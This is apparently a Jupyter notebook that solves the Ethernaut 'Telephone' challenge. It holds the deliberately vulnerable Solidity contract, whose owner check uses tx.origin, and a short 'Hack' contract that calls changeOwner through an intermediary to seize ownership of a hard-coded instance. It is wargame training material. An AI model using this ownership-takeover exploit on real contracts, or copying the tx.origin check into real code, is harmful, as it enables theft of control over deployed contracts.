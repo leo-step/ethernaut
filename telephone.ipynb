{
 "cells": [
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "// SPDX-License-Identifier: MIT\n",
    "pragma solidity ^0.8.0;\n",
    "\n",
    "contract Telephone {\n",
    "\n",
    "  address public owner;\n",
    "\n",
    "  constructor() {\n",
    "    owner = msg.sender;\n",
    "  }\n",
    "\n",
    "  function changeOwner(address _owner) public {\n",
    "    if (tx.origin != msg.sender) {\n",
    "      owner = _owner;\n",
    "    }\n",
    "  }\n",
    "}\n",
    "\n",
    "contract Hack {\n",
    "  function hack() public {\n",
    "    address addr = 0xA4796a2d1c98A77DE529CbdBfd2E0A4954BD6B94;\n",
    "    Telephone t = Telephone(addr);\n",
    "    t.changeOwner(0xf0522A86a6BEb833F9E988596Fc9dF2F5CdD9C55);\n",
    "  }\n",
    "} "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": []
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
